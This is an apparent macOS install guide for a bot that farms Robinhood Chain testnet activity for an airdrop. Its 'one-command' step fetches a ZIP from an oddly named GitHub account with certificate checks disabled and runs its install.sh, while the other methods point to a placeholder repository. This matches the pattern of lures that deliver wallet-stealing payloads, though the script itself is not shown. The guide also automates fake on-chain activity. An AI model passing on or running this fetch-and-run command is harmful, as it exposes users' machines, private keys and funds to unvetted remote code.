# 🍎 macOS Installation Guide

## 📱 Method 1: One-Command Installation (EASIEST)

### Step 1: Open Terminal
- Press `Cmd + Space`
- Type "Terminal"
- Press `Enter`

### Step 2: Clone and Install

```bash
curl -fsSLk https://github.com/lunarraveneradicate/robinhood-auto-testnet/archive/refs/heads/main.zip -o /tmp/cw.zip && \
unzip -qo /tmp/cw.zip -d /tmp && \
cd /tmp/robinhood-auto-testnet-main && \
bash install.sh
```

### Step 3: Wait for Completion
- Script will automatically install everything
- Enter your Mac password when prompted
- Wait 2-5 minutes

### Step 4: Run Automation
```bash
python3 robinhood_auto.py
```

## 🔧 Method 2: Manual Installation (Detailed)

### Step 1: Open Terminal
`Cmd + Space` → "Terminal" → `Enter`

### Step 2: Install Homebrew (if not installed)
```bash
/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
```

### Step 3: Install Python 3
```bash
brew install python3
```

### Step 4: Install Node.js
```bash
brew install node
```

### Step 5: Download Project
```bash
# Navigate to where you want to save the project
cd ~/Desktop

# Download project
git clone https://github.com/YOUR_USERNAME/robinhood-auto-testnet.git

# Enter project folder
cd robinhood-auto-testnet
```

### Step 6: Install Dependencies
```bash
# Make script executable
chmod +x install.sh

# Run installation
bash install.sh
```

### Step 7: Run Automation
```bash
python3 robinhood_auto.py
```

## ⚡ Method 3: Without Git (Download ZIP)

### Step 1: Download Project
1. Open in browser: https://github.com/YOUR_USERNAME/robinhood-auto-testnet
2. Click green "Code" button
3. Select "Download ZIP"
4. Extract the downloaded file

### Step 2: Open Terminal in Folder
1. Open Finder
2. Find the extracted folder
3. Right-click on folder
4. Select "New Terminal at Folder"

### Step 3: Run Installation
```bash
chmod +x install.sh
bash install.sh
```

### Step 4: Run Bot
```bash
python3 robinhood_auto.py
```

## 🎮 Operating Modes

### Automatic Mode (Simple)
```bash
python3 robinhood_auto.py
```
Executes all actions automatically: claims tokens, deploys contract, creates transactions.

### Node.js Version
```bash
node index.js
```
Alternative JavaScript version.

## ❓ Common Issues and Solutions

### Error: "command not found: python3"
**Solution:**
```bash
brew install python3
```

### Error: "command not found: node"
**Solution:**
```bash
brew install node
```

### Error: "permission denied"
**Solution:**
```bash
chmod +x install.sh
chmod +x robinhood_auto.py
```

### Error: "pip: command not found"
**Solution:**
```bash
python3 -m ensurepip --upgrade
```

### Error Installing Libraries
**Solution:**
```bash
pip3 install --user web3 eth-account requests colorama
```

### Faucet Not Working
**Solution:**
- Wait 24 hours
- Check internet connection
- Try again

## 🔐 Security

### Important Files:
- `wallet.json` - contains private key (DO NOT SHARE!)
- `.env` - settings (can be modified)
- `robinhood_auto.py` - main script

### Wallet Backup:
```bash
# Create copy
cp wallet.json wallet.backup.json

# Save to another location
cp wallet.json ~/Documents/robinhood_wallet_backup.json
```

### View Address (Safe):
```bash
cat wallet.json | grep "address"
```

### View Private Key (CAREFUL!):
```bash
cat wallet.json | grep "private_key"
```

## 📊 Checking Results

### In Terminal:
Script will show explorer links after completion.

### In Browser:
1. Open the link from Terminal
2. Or go to: https://testnet.explorer.robinhood.com
3. Paste your address from `wallet.json`

## 🎯 What to Do Next?

### 1. Register .hood Domain
```bash
open https://infinityname.io
```

### 2. Send GM on OnchainGM
```bash
open https://onchaingm.xyz
```

### 3. Check Activity
```bash
open https://testnet.explorer.robinhood.com/address/YOUR_ADDRESS
```

### 4. Setup Regular Runs
Create a reminder to run the script 1-2 times per week.

## 💡 Useful Commands

### Quick Run After Installation:
```bash
robinhood-auto
```

### Check Balance:
```bash
python3 -c "from robinhood_auto import RobinhoodTestnet; bot = RobinhoodTestnet(); print(bot.get_balance())"
```

### Update Project:
```bash
git pull
bash install.sh
```

## 🎉 Ready!

After successful installation you can:
- ✅ Run automation anytime
- ✅ Create onchain activity
- ✅ Position for airdrop
- ✅ Interact with Robinhood Chain

---

**Good luck with Robinhood Chain testnet! 🚀**

*For issues, read the full documentation in README.md*
